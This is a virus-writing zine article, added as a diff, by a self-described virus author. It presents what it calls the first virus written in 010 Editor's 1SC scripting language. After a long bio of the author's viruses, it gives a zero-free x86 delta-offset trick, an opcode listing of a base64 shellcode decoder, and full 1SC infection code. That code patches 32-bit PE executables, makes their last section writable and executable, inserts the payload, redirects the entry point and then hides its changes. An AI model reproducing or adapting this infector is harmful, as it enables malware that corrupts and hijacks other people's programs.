@@ -1,0 +1,229 @@
+                              010 Editor Scripts
+                              roy g biv / defjam
+
+                                 -= defjam =-
+                                  since 1992
+                     bringing you the viruses of tomorrow
+                                    today!
+
+
+Former  DOS/Win16  virus writer, author of several virus  families,  including
+Ginger  (see Coderz #1 zine for terrible buggy example, contact me for  better
+sources  ;),  and Virus Bulletin 9/95 for a description of what   they  called
+Rainbow.   Co-author  of  world's first virus using circular  partition  trick
+(Orsam, coded with Prototype in 1993).  Designer of world's first XMS swapping
+virus  (John Galt, coded by RT Fishel in 1995, only 30 bytes stub, the rest is
+swapped  out).   Author of world's first virus using Thread Local Storage  for
+replication  (Shrug, see Virus Bulletin 6/02 for a description, but they  call
+it Chiton), world's first virus using Visual Basic 5/6 language extensions for
+replication  (OU812), world's first Native executable virus (Chthon),  world's
+first  virus  using process co-operation to prevent termination  (Gemini,  see
+Virus  Bulletin 9/02 for a description), world's first virus using polymorphic
+SMTP  headers (JunkMail, see Virus Bulletin 11/02 for a description),  world's
+first viruses that can convert any data files to infectable objects (Pretext),
+world's  first  32/64-bit  parasitic  EPO .NET  virus  (Croissant,  see  Virus
+Bulletin  11/04  for a description, but they call it Impanate), world's  first
+virus  using  self-executing HTML (JunkHTMaiL, see Virus Bulletin 7/03  for  a
+description), world's first virus for Win64 on Intel Itanium (Shrug, see Virus
+Bulletin 6/04 for a description, but they call it Rugrat), world's first virus
+for  Win64 on AMD AMD64 (Shrug), world's first cross-infecting virus for Intel
+IA32  and  AMD  AMD64  (Shrug),  world's  first  viruses  that  infect  Office
+applications  and  script  files  using the same  code  (Macaroni,  see  Virus
+Bulletin  11/05  for  a description, but they call it Macar),  world's   first
+viruses  that  can infect both VBS and JScript using the same code (ACDC,  see
+Virus  Bulletin 11/05 for a description, but they call it Cada), world's first
+virus  that  can  infect  CHM files (Charm, see Virus  Bulletin  10/06  for  a
+description,  but they call it Chamb), world's first IDA plugin virus  (Hidan,
+see Virus Bulletin 3/07 for a description), world's first viruses that use the
+Microsoft  Script  Encoder  to dynamically encrypt the  virus  body  (Screed),
+world's  first virus for StarOffice and OpenOffice (Starbucks), world's  first
+virus  IDC  virus (ID10TiC), world's first polymorphic virus for Win64 on  AMD
+AMD64  (Boundary, see Virus Bulletin 12/06 for a description, but they call it
+Bounds),  world's first virus that can infect Intel-format and  PowerPC-format
+Mach-O  files  (MachoMan,  see  Virus Bulletin 01/07 for  a  description,  but
+they  call  it  Macarena), world's first virus that uses  Unicode  escapes  to
+dynamically encrypt the virus body, world's first self-executing PIF (Spiffy),
+world's  first  self-executing  LNK (WeakLNK), world's first virus  that  uses
+virtual  code  (Relock),  world's  first virus to use  FSAVE  for  instruction
+reordering  (Mimix), world's first virus for ODbgScript (Volly), world's first
+Hiew   plugin  virus  (Hiewg),  world's  first  virus  that  uses  fake   BOMs
+(Bombastic),  world's  first virus that uses JScript prototypes to run  itself
+(Protato),  and  world's first virus that uses Heaven's Gate  for  replication
+(Heaven).   Author  of  various retrovirus  articles (eg see Vlad #7  for  the
+strings that  make your code invisible to TBScan).  This is my first virus for
+010 Editor script.  It is the world's first virus for 010 Editor script.
+
+
+What is it?
+
+Many  people know about the 010 Editor.  It is a great tool for examining file
+structure  using templates.  It supports a scripting language called 1SC.  010
+Editor has a powerful scripting engine that allows many tasks to be automated,
+including infecting files. ;)
+
+
+1SC language
+
+It  became  obvious  to me when I first saw 010 Editor script,  that  I  could
+write  a virus in it.  When a file is opened, it can be written unless it  has
+the  read-only  attribute set.  This is by design, of course.  So it became  a
+matter  of  writing  code to infect the files, but how can a script  infect  a
+binary  file?   The  infection is really just making the binary  file  into  a
+dropper of the script.  There is nothing special here.
+
+
+Limitations
+
+Of course there were some problems.  The 1SC language does not support casting
+of variables, so you cannot build an integer from an array of chars.  You have
+to  work  with the chars one by one.  That was annoying but I did that.   Next
+challenge  was  to  insert binary code into a binary file.   This  requires  a
+string  of binary characters.  The problem is that strings cannot contain  any
+zeroes, otherwise the length is where the zero is.  There are two solutions to
+this  problem.  One solution is to write the code with no zeroes, but this  is
+really  hard  for large programs.  Another solution is encode the string.   We
+can use any character except zero in the string, so if we have an unused value
+then  we  can XOR all of the bytes with that value.  But if we have no  unused
+value  then  we have no luck there.  We can encode the string in another  way,
+such as convert to printable text with an IMUL decoder.  This doubles the size
+of  the string, so that's not good either.  I made a base128 encoder that sets
+bit 7 in every byte, and decoder is only 26 bytes, but then every byte must be
+escaped  which  triples  the size of the string.  Finally, I  chose  a  base64
+encoder.   The string is only 1/3 larger and decoder is only 64 bytes  because
+uses no dictionary.
+
+
+Delta offset
+
+The  base64 decoder contains no zeroes and supports ASLR using a trick that  I
+never  saw  before.  It seems that everyone copies everyone else to get  delta
+offset without any zeroes, like this:
+
+     eb03       ;jmp  fwd
+back:5e         ;pop  esi
+     eb05       ;jmp  ok
+fwd: e8f8ffffff ;call back
+ok:  <continue>
+
+10 bytes.  How about we do it in 7?
+
+     e8ffffffff ;call $-1 ;points to ff
+     c0         ;ffc0=inc eax
+     5e         ;pop  esi
+
+
+Base64
+
+Here's the rest of the base64 decoder:
+
+     83C632     ;add    esi, $+34h
+     8BFE       ;mov    edi, esi
+
+b64decode       proc    near
+     AD         ;lods   dword ptr [esi]
+     6A04       ;push   4
+     59         ;pop    ecx
+
+b64_inner       label   near
+     C1C008     ;rol    eax, 8
+     3C30       ;cmp    al, '0'
+     7305       ;jnb    b64_testchar
+     2C43       ;sub    al, -(('/' shl 2) + 1) and 0ffh
+     C0E802     ;shr    al, 2 ;'+' and '/' differ by only 1 bit
+
+b64_testchar    label   near
+     0404       ;add    al, 4
+     3C3F       ;cmp    al, 3fh
+     7608       ;jbe    b64_store
+     2C45       ;sub    al, 45h
+     3C19       ;cmp    al, 19h
+     7602       ;jbe    b64_store
+     2C06       ;sub    al, 6
+
+b64_store       label   near
+     0FACC206   ;shrd   edx, eax, 6
+     E2E0       ;loop   b64_inner
+     92         ;xchg   edx, eax
+     0FC8       ;bswap  eax
+     AB         ;stos   dword ptr [edi]
+     4F         ;dec    edi
+     803E       ;cmp    byte ptr [esi], ...
+     49485853   ;base64-encoded cmp byte and branch
+
+
+Here is the 1SC code:
+        
+int a=<codesize>,c=FileSize(),d,f,g,h,i,j,k,l;
+char b[a]="<decoder+base64>",e[96];
+if(c>64)
+{
+  d=ReadInt(60);                                /* read lfanew */
+  if(d+96<c)                                    /* if read is within file */
+  {
+    e[92]=0;                                    /* if read stops before this field
+                                                   then we can detect the error
+                                                */
+    ReadBytes(e,d,96);
+    f=d+ReadShort(d+6)*40+ReadShort(d+20);      /* inside last section header if PE file */
+    if(f+8<c)                                   /* if read is within file */
+    {
+      g=ReadInt(f);                             /* SizeOfRawData */
+      h=ReadInt(f+4);                           /* PointerToRawData */
+      if(ReadShort(GetReadOnly())==0x5a4d       /* 'MZ'
+                                                   read from offset 1 if read-only
+                                                   can't match in that case
+                                                */
+       &&ReadInt(d)==0x4550                     /* PE */
+       &&e[4]==76&&e[5]==1                      /* IMAGE_FILE_MACHINE_I386 */
+       &&e[22]&2                                /* IMAGE_FILE_EXECUTABLE_IMAGE */
+       &&(e[23]&49)==1                          /* IMAGE_FILE_32BIT_MACHINE
+                                                   and not IMAGE_FILE_SYSTEM or IMAGE_FILE_DLL
+                                                */
+       &&!e[93]&&(e[92]-2)<2                    /* IMAGE_SUBSYSTEM_WINDOWS_GUI or IMAGE_SUBSYSTEM_WINDOWS_CUI */
+       &&!(e[95]&32)                            /* not IMAGE_DLLCHARACTERISTICS_WDM_DRIVER */
+       &&!ReadInt(d+152)                        /* no digital certificates */
+       &&g+h==c)                                /* no appended data */
+      {
+        i=ReadInt(d+60);                        /* FileAlignment */
+        InsertBytes(c,i+Random(2048)+4096+a);   /* increase file size by random amount */
+        WriteInt(f,i=(g+a+i-1)&-i);             /* round up SizeOfRawData */
+        j=ReadInt(f-8);                         /* VirtualSize */
+        k=ReadInt(f-4);                         /* VirtualAddress */
+        if(j<i)                                 /* if VirtualSize < SizeOfRawData */
+        {
+          WriteInt(f-8,i);                      /* set new VirtualSize */
+          l=ReadInt(d+56);                      /* SectionAlignment */
+          WriteInt(d+80,j=(k+i+l-1)&-l);        /* round up SizeOfImage */
+        }
+        WriteByte(f+27,ReadByte(f+27)|160);     /* mark section writable and executable */
+        g+=k;
+        l=ReadInt(d+160);                       /* Base Relocation Table RVA if present */
+        if(e[22]&1==0                           /* if not IMAGE_FILE_RELOCS_STRIPPED */
+         &&l>=k&&l<k+j)                         /* and Base Relocation Table is in last section */
+        {
+          WriteInt(d+160,l+a);                  /* move Base Relocation Table down in file */
+          c=l+h-k;                              /* calculate physical offset */
+          g=l;
+        }
+        InsertBytes(c,a);                       /* make gap */
+        WriteBytes(b,c,a);                      /* place code */
+        WriteInt(c+1,ReadInt(d+40));            /* append OEP */
+        WriteInt(d+40,g);                       /* set new AddressOfEntryPoint */
+        WriteInt(d+88,0);                       /* zero CheckSum */
+        FileSave(GetFileName());                /* commit changes */
+        FileClose();                            /* hide changes */
+      }
+    }
+  }
+}
+
+
+Greets to friendly people (A-Z):
+
+Active - Benny - herm1t - hh86 - izee - jqwerty - Malum - Obleak - Prototype -
+Ratter - Ronin - RT Fishel - sars - SPTH - The Gingerbread Man - Ultras -
+uNdErX - Vallez - Vecna - Whitehead
+
+
+rgb/defjam jul 2011
+iam_rgb@hotmail.com
